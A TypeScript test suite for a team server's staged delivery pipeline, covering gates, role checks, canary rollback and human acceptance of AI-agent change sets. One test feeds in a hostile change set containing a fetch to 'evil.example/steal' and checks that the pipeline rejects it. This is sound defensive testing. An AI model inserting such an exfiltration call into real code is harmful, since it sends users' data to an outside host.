import assert from 'node:assert/strict';
import { afterAll, beforeAll, describe, test } from 'bun:test';
import { TokenError } from '../src/auth.ts';
import { MemoryCollabStore } from '../src/collab-store.ts';
import { loadConfig } from '../src/config.ts';
import { setSilent } from '../src/log.ts';
import { FAKE_5XX, FAKE_FAIL, FakePipelineDriver } from '../src/pipeline/fake.ts';
import { Pipeline } from '../src/pipeline/service.ts';
import { createTeamServer } from '../src/server.ts';
import type { TeamServer } from '../src/server.ts';
import { MemoryStore, OFFICE_ID } from '../src/store.ts';
import type { Issue } from '../src/shared/board/types.ts';
import type { Gate } from '../src/shared/pipeline/gates.ts';
import type { Artifact, ArtifactDraft, ChangeFile } from '../src/shared/pipeline/types.ts';
import type { WorkspaceRole } from '../src/shared/workspace/types.ts';

setSilent(true);

const tok = (uid: string, role: WorkspaceRole) => `${uid}|${role}`;
const OWNER = tok('g-1', 'owner');
const MEMBER = tok('g-2', 'member');
const fakeAuth = {
  verify: async (t: string) => {
    const [uid, role] = t.split('|');
    if (!uid || !role) throw new TokenError('invalid token');
    return { uid, role: role as WorkspaceRole, name: uid === 'g-1' ? 'Ada' : 'Bo', provider: 'dev' as const };
  },
};

const SPEC = '## Acceptance criteria\n- [ ] The order list filters by status';

describe('the delivery pipeline', () => {
  let server: TeamServer;
  let pipeline: Pipeline;
  let driver: FakePipelineDriver;
  let collabStore: MemoryCollabStore;
  let base = '';
  let clock = 1_800_000_000_000;
  const advanceClock = (ms: number) => (clock += ms);

  const api = async <T = any>(method: string, path: string, token?: string, body?: unknown): Promise<{ status: number; json: T | null }> => {
    const res = await fetch(`${base}${path}`, {
      method,
      headers: { ...(token ? { authorization: `Bearer ${token}` } : {}), ...(body ? { 'content-type': 'application/json' } : {}) },
      body: body ? JSON.stringify(body) : undefined,
    });
    return { status: res.status, json: (await res.json().catch(() => null)) as T | null };
  };

  beforeAll(async () => {
    const store = new MemoryStore();
    collabStore = new MemoryCollabStore();
    driver = new FakePipelineDriver({ now: () => clock, jobMs: 1000, jobsPerGuestHour: 40, jobsPerDay: 60, maxConcurrent: 3 });
    const cfg = { ...loadConfig(), devAuth: false, store: 'memory' as const, pipelineEnabled: true, pipelineDriver: 'fake' as const };
    const { Collab } = await import('../src/collab.ts');
    pipeline = new Pipeline(new Collab(collabStore, () => clock), collabStore, driver, () => clock);
    server = createTeamServer({ cfg, store, collabStore, auth: fakeAuth, ai: null, pipeline, pipelineLimits: { ip: [10_000, 10_000], writes: [10_000, 10_000] }, collabLimits: { ip: [10_000, 10_000], writes: [10_000, 10_000] } });
    base = `http://127.0.0.1:${await server.listen(0)}`;
  });
  afterAll(async () => {
    await server.close();
  });

  const newTicket = async (title = 'Filter orders by status'): Promise<Issue> => (await api<{ issue: Issue }>('POST', '/board/issues', OWNER, { title })).json!.issue;
  const gateOf = async (id: string, token = OWNER) => (await api<{ stage: string; gate: Gate }>('GET', `/tickets/${id}/gate`, token)).json!;
  const advance = (id: string, to: string, token = OWNER) => api<any>('POST', `/tickets/${id}/advance`, token, { to });
  const owner = { uid: 'g-1', name: 'Ada', role: 'owner' as const };

  /** A change set against the trunk as it is now. */
  async function changeSet(files: { path: string; role: ChangeFile['role']; content: string }[]): Promise<ArtifactDraft> {
    const { files: repo } = await driver.repo();
    const shas = new Map(repo.map((f) => [f.path, f.sha]));
    return { kind: 'change_set', title: 'Filter by status', body: 'Adds a status filter to the order list.', files: files.map((f) => ({ ...f, op: 'write' as const, baseSha: shas.get(f.path) ?? null })) };
  }
  const goodFiles = [
    { path: 'sample-app/src/OrderList.tsx', role: 'src' as const, content: 'export function OrderList() {\n  return <ul aria-label="Orders" />;\n}\n// filter\n' },
    { path: 'sample-app/tests/filter.test.ts', role: 'unit_test' as const, content: "it('filters', () => expect(1).toBe(1));\n" },
  ];
  const accept = async (draft: ArtifactDraft, ticket: Issue): Promise<Artifact> => {
    const a = await pipeline.submit(ticket.id, { id: 'agent:developer', name: 'Developer Agent', agent: true }, draft);
    return (await api<{ artifact: Artifact }>('POST', `/artifacts/${a.id}/decide`, OWNER, { decision: 'accepted' })).json!.artifact;
  };
  /** Runs a job to its end (the fake's clock moves), and returns it. */
  async function runJob(ticket: Issue, kind: string, token = OWNER) {
    const started = await api<{ job: { id: string } }>('POST', '/pipeline/jobs', token, { ticket: ticket.id, kind });
    assert.equal(started.status, 201, JSON.stringify(started.json));
    advanceClock(1500);
    return (await api<{ job: any }>('GET', `/pipeline/jobs/${started.json!.job.id}`, token)).json!.job;
  }

  test('the pipeline is on for the app, and a new ticket starts in Plan', async () => {
    assert.equal((await (await fetch(`${base}/config`)).json() as { pipeline: boolean }).pipeline, true);
    const t = await newTicket();
    assert.deepEqual(t.pipeline, { stage: 'plan', mainRev: 'main@0' });
    assert.equal(t.status, 'todo');
  });

  test('a ticket in the pipeline cannot be moved by an edit: its stage decides', async () => {
    const t = await newTicket('Edit me');
    const res = await api('PATCH', `/board/issues/${t.id}`, OWNER, { status: 'in_progress' });
    assert.equal(res.status, 409);
    assert.equal(res.json.error, 'pipeline_stage');
    assert.equal((await api('PATCH', `/board/issues/${t.id}`, OWNER, { title: 'Edited title' })).status, 200);
  });

  test('only someone signed in reaches the pipeline', async () => {
    assert.equal((await api('GET', '/artifacts')).status, 401);
    assert.equal((await api('GET', '/pipeline/jobs', 'garbage')).status, 401);
  });

  test('a ticket goes Plan → Design → Build → Test → Release → Deploy → Done, and every gate holds until its work is done', async () => {
    const t = await newTicket('Order status filter');

    // Plan: no spec, no way forward; a spec without criteria is not enough; a draft is not accepted.
    assert.equal((await advance(t.id, 'design')).status, 409);
    const prose = await accept({ kind: 'spec', title: 'Spec', body: 'Just prose.' }, t);
    assert.equal(prose.state, 'accepted');
    assert.equal((await advance(t.id, 'design')).status, 409, 'prose is not acceptance criteria');
    await accept({ kind: 'spec', title: 'Spec v2', body: SPEC }, t);
    assert.equal((await advance(t.id, 'design')).status, 200);
    assert.equal((await gateOf(t.id)).stage, 'design');

    // A ticket moves one stage at a time.
    assert.equal((await advance(t.id, 'test')).status, 409);

    // Design: "No UI change" is a person's own accepted design.
    assert.equal((await api('POST', `/tickets/${t.id}/design/no-ui`, OWNER)).status, 201);
    assert.equal((await advance(t.id, 'build')).status, 200);

    // Build: a change set must be accepted, and the build must pass on that digest.
    assert.equal((await advance(t.id, 'test')).status, 409);
    const set = await accept(await changeSet(goodFiles), t);
    assert.equal((await advance(t.id, 'test')).status, 409, 'accepted, but not built yet');
    assert.equal((await runJob(t, 'build')).state, 'passed');
    assert.equal((await advance(t.id, 'test')).status, 200);

    // Test: unit tests, coverage and end-to-end tests, all on that change set.
    assert.equal((await advance(t.id, 'release')).status, 409);
    const unit = await runJob(t, 'unit');
    assert.equal(unit.summary.coveragePct, 82);
    assert.equal((await advance(t.id, 'release')).status, 409, 'no end-to-end run yet');
    assert.equal((await runJob(t, 'e2e')).state, 'passed');
    assert.equal((await advance(t.id, 'release')).status, 200);

    // Release: a pack, an image and a scan; the image is built only after the tests passed, in Release.
    await accept({ kind: 'release_pack', title: 'Release pack', body: '## Release notes\nAdds a status filter.' }, t);
    assert.equal((await advance(t.id, 'deploy')).status, 409);
    const image = await runJob(t, 'release_build');
    assert.match(image.imageDigest, /^sha256:/);
    assert.equal((await advance(t.id, 'deploy')).status, 409, 'not scanned yet');
    assert.equal((await runJob(t, 'scan')).state, 'passed');
    assert.equal((await advance(t.id, 'deploy', MEMBER)).status, 409, 'a member cannot approve a release');
    assert.equal((await advance(t.id, 'deploy')).status, 200);
    assert.equal((await api('GET', `/board/issues/${t.id}`, OWNER)).json.issue.status, 'review');

    // Deploy: staging first, then production in steps; Done only at 100%.
    assert.equal((await api('POST', '/pipeline/rollouts', OWNER, { ticket: t.id, service: 'production' })).status, 409, 'staging first');
    const staging = (await api<{ rollout: any }>('POST', '/pipeline/rollouts', OWNER, { ticket: t.id, service: 'staging' })).json!.rollout;
    assert.equal(staging.state, 'complete');
    const prod = (await api<{ rollout: any }>('POST', '/pipeline/rollouts', OWNER, { ticket: t.id, service: 'production' })).json!.rollout;
    assert.equal(prod.trafficPct, 0);
    assert.equal((await api('POST', `/pipeline/rollouts/${prod.id}/step`, MEMBER)).status, 403);
    for (const pct of [10, 50]) {
      const step = (await api<{ rollout: any }>('POST', `/pipeline/rollouts/${prod.id}/step`, OWNER)).json!.rollout;
      assert.equal(step.trafficPct, pct);
      assert.equal(step.state, 'canary');
    }
    assert.equal((await advance(t.id, 'done')).status, 409, 'not at 100% yet');
    const last = (await api<{ rollout: any }>('POST', `/pipeline/rollouts/${prod.id}/step`, OWNER)).json!.rollout;
    assert.equal(last.state, 'complete');
    const done = await advance(t.id, 'done');
    assert.equal(done.status, 200);
    assert.equal(done.json.issue.status, 'done');
    assert.equal(done.json.issue.pipeline.mainRev, 'main@1', 'shipping moved the trunk');

    // The trail says who did what.
    const trail = (await api<{ events: { action: string }[] }>('GET', '/pipeline/audit', OWNER)).json!.events.map((e) => e.action);
    for (const a of ['artifact.accept', 'ticket.advance', 'job.start', 'rollout.start', 'rollout.step']) assert.ok(trail.includes(a), a);
    assert.ok(set.digest.length === 64);
  });

  test('a failing job keeps the gate shut, and the next change set has to start over', async () => {
    const t = await newTicket('Broken filter');
    await accept({ kind: 'spec', title: 'Spec', body: SPEC }, t);
    await advance(t.id, 'design');
    await api('POST', `/tickets/${t.id}/design/no-ui`, OWNER);
    await advance(t.id, 'build');
    await accept(await changeSet([{ path: 'sample-app/src/OrderList.tsx', role: 'src', content: `export const x = 1;\n${FAKE_FAIL}\n` }]), t);
    assert.equal((await runJob(t, 'build')).state, 'failed');
    const gate = await gateOf(t.id);
    assert.equal(gate.gate.ready, false);
    assert.equal(gate.gate.checks.find((c) => c.id === 'build')?.detail, 'It failed. Fix it and run it again.');
    // A new, accepted change set is a new digest: the failed job no longer counts for or against it.
    await accept(await changeSet([{ path: 'sample-app/src/OrderList.tsx', role: 'src', content: 'export const x = 2;\n' }]), t);
    assert.equal((await gateOf(t.id)).gate.checks.find((c) => c.id === 'build')?.detail, 'Run the build.');
  });

  test('a change set that does something an AI-written change may not do is refused, and so is one written against old code', async () => {
    const t = await newTicket('Hostile change');
    const hostile = await changeSet([{ path: 'sample-app/src/OrderList.tsx', role: 'src', content: "await fetch('https://evil.example/steal');\n" }]);
    await assert.rejects(pipeline.submit(t.id, { id: 'agent:developer', name: 'Developer Agent', agent: true }, hostile), /cannot use network call/);
    const stale = await changeSet(goodFiles);
    stale.files![0].baseSha = 'f'.repeat(64);
    await assert.rejects(pipeline.submit(t.id, { id: 'agent:developer', name: 'Developer Agent', agent: true }, stale), /changed on main/);
    // Written against the trunk, then the trunk moved before a person accepted it.
    const fresh = await pipeline.submit(t.id, { id: 'agent:developer', name: 'Developer Agent', agent: true }, await changeSet(goodFiles));
    const other = await newTicket('Another change');
    await accept({ kind: 'spec', title: 's', body: SPEC }, other);
    await advance(other.id, 'design');
    await api('POST', `/tickets/${other.id}/design/no-ui`, OWNER);
    await advance(other.id, 'build');
    await accept(await changeSet([{ path: 'sample-app/src/OrderList.tsx', role: 'src', content: 'export const moved = true;\n' }]), other);
    await runJob(other, 'build');
    await advance(other.id, 'test');
    await runJob(other, 'unit');
    await runJob(other, 'e2e');
    await advance(other.id, 'release');
    await accept({ kind: 'release_pack', title: 'p', body: 'notes' }, other);
    await runJob(other, 'release_build');
    await runJob(other, 'scan');
    await advance(other.id, 'deploy');
    await api('POST', '/pipeline/rollouts', OWNER, { ticket: other.id, service: 'staging' });
    const pr = (await api<{ rollout: any }>('POST', '/pipeline/rollouts', OWNER, { ticket: other.id, service: 'production' })).json!.rollout;
    for (let i = 0; i < 3; i++) await api('POST', `/pipeline/rollouts/${pr.id}/step`, OWNER);
    const res = await api('POST', `/artifacts/${fresh.id}/decide`, OWNER, { decision: 'accepted' });
    assert.equal(res.status, 409, 'the trunk moved while it waited');
    assert.equal(res.json.error, 'stale');
  });

  test('a canary that fails its checks goes back by itself, and the ticket cannot be called done', async () => {
    const t = await newTicket('Bad candidate');
    await accept({ kind: 'spec', title: 's', body: SPEC }, t);
    await advance(t.id, 'design');
    await api('POST', `/tickets/${t.id}/design/no-ui`, OWNER);
    await advance(t.id, 'build');
    await accept(await changeSet([{ path: 'sample-app/src/api/orders.ts', role: 'src', content: `export const orders = [];\n${FAKE_5XX}\n` }]), t);
    await runJob(t, 'build');
    await advance(t.id, 'test');
    assert.equal((await runJob(t, 'unit')).state, 'passed', 'it passes its unit tests');
    await runJob(t, 'e2e');
    await advance(t.id, 'release');
    await accept({ kind: 'release_pack', title: 'p', body: 'notes' }, t);
    await runJob(t, 'release_build');
    await runJob(t, 'scan');
    await advance(t.id, 'deploy');
    await api('POST', '/pipeline/rollouts', OWNER, { ticket: t.id, service: 'staging' });
    const prod = (await api<{ rollout: any }>('POST', '/pipeline/rollouts', OWNER, { ticket: t.id, service: 'production' })).json!.rollout;
    const step = (await api<{ rollout: any }>('POST', `/pipeline/rollouts/${prod.id}/step`, OWNER)).json!.rollout;
    assert.equal(step.state, 'rolled_back');
    assert.equal(step.trafficPct, 0);
    assert.equal(step.checks.at(-1).ok, false);
    assert.equal((await advance(t.id, 'done')).status, 409);
    const trail = (await api<{ events: { action: string }[] }>('GET', '/pipeline/audit', OWNER)).json!.events.map((e) => e.action);
    assert.ok(trail.includes('rollout.rolled_back'));
  });

  test('only one rollout per environment at a time', async () => {
    const t = await newTicket('Locked');
    await accept({ kind: 'spec', title: 's', body: SPEC }, t);
    await advance(t.id, 'design');
    await api('POST', `/tickets/${t.id}/design/no-ui`, OWNER);
    await advance(t.id, 'build');
    await accept(await changeSet([{ path: 'sample-app/src/main.tsx', role: 'src', content: 'export const a = 1;\n' }]), t);
    await runJob(t, 'build');
    await advance(t.id, 'test');
    await runJob(t, 'unit');
    await runJob(t, 'e2e');
    await advance(t.id, 'release');
    await accept({ kind: 'release_pack', title: 'p', body: 'notes' }, t);
    await runJob(t, 'release_build');
    await runJob(t, 'scan');
    await advance(t.id, 'deploy');
    await api('POST', '/pipeline/rollouts', OWNER, { ticket: t.id, service: 'staging' });
    assert.equal((await api('POST', '/pipeline/rollouts', OWNER, { ticket: t.id, service: 'production' })).status, 201);
    const second = await api('POST', '/pipeline/rollouts', OWNER, { ticket: t.id, service: 'production' });
    assert.equal(second.status, 409);
    assert.equal(second.json.error, 'locked');
  });

  test('jobs obey the stage the ticket is in and what has already passed', async () => {
    const t = await newTicket('Order of work');
    assert.equal((await api('POST', '/pipeline/jobs', OWNER, { ticket: t.id, kind: 'build' })).json.error, 'no_change_set');
    await accept({ kind: 'spec', title: 's', body: SPEC }, t);
    await advance(t.id, 'design');
    await api('POST', `/tickets/${t.id}/design/no-ui`, OWNER);
    await advance(t.id, 'build');
    await accept(await changeSet([{ path: 'sample-app/src/main.tsx', role: 'src', content: 'export const b = 1;\n' }]), t);
    assert.equal((await api('POST', '/pipeline/jobs', OWNER, { ticket: t.id, kind: 'release_build' })).json.error, 'stage');
    assert.equal((await api('POST', '/pipeline/jobs', OWNER, { ticket: t.id, kind: 'deploy' })).status, 400);
    const first = await api('POST', '/pipeline/jobs', OWNER, { ticket: t.id, kind: 'build' });
    assert.equal(first.status, 201);
    const again = await api('POST', '/pipeline/jobs', OWNER, { ticket: t.id, kind: 'build' });
    assert.equal(again.json.error, 'running', 'the same job is not started twice');
    const log = await api<{ text: string; next: number; done: boolean }>('GET', `/pipeline/jobs/${first.json.job.id}/log`, OWNER);
    assert.equal(log.status, 200);
    assert.equal(typeof log.json!.next, 'number');
    assert.equal((await api('POST', `/pipeline/jobs/${first.json.job.id}/cancel`, OWNER)).json.job.state, 'cancelled');
  });

  test('the thresholds change only for an owner or an admin, and only to values that make sense', async () => {
    assert.equal((await api('PUT', '/pipeline/policy', MEMBER, { coverageMin: 10 })).status, 403);
    assert.equal((await api('PUT', '/pipeline/policy', OWNER, { coverageMin: 400 })).status, 400);
    const ok = await api('PUT', '/pipeline/policy', OWNER, { coverageMin: 90 });
    assert.equal(ok.status, 200);
    assert.equal((await api('GET', '/pipeline/status', OWNER)).json.policy.coverageMin, 90);
    await api('PUT', '/pipeline/policy', OWNER, { coverageMin: 70 });
  });

  test('an artifact is the same artifact when the same words are proposed again, and a newer draft replaces an older one', async () => {
    const t = await newTicket('Drafts');
    const author = { id: 'agent:designer', name: 'Designer Agent', agent: true };
    const a = await pipeline.submit(t.id, author, { kind: 'design', title: 'Screens', body: '<main>v1</main>' });
    const again = await pipeline.submit(t.id, author, { kind: 'design', title: 'Screens', body: '<main>v1</main>' });
    assert.equal(again.id, a.id);
    const b = await pipeline.submit(t.id, author, { kind: 'design', title: 'Screens', body: '<main>v2</main>' });
    assert.equal(b.version, 2);
    assert.equal((await pipeline.artifact(a.id)).state, 'superseded');
    const accepted = await pipeline.decide(b.id, owner, 'accepted');
    assert.equal(accepted.decidedBy, 'g-1');
    await assert.rejects(pipeline.decide(b.id, owner, 'rejected'), /already been decided/);
  });

  test('a reset forgets the artifacts and puts the trunk back', async () => {
    await pipeline.reset();
    await collabStore.clearAll();
    assert.deepEqual(await pipeline.artifacts(), []);
    assert.deepEqual(await pipeline.jobs(), []);
    assert.equal((await driver.repo()).rev, 'main@0');
  });
});
